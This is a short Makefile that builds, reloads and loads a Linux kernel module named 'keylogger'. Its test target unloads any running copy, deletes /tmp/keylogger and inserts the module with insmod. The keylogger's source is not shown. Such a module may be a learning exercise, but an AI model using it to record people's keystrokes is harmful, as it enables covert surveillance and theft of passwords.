obj-m += keylogger.o

RET := $(shell lsmod | grep keylogger > /dev/null ; echo $$?)

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

test:
	make clean
	make
ifeq ($(RET),0)
	rmmod keylogger
	rm /tmp/keylogger
endif
	dmesg -C
	insmod keylogger.ko
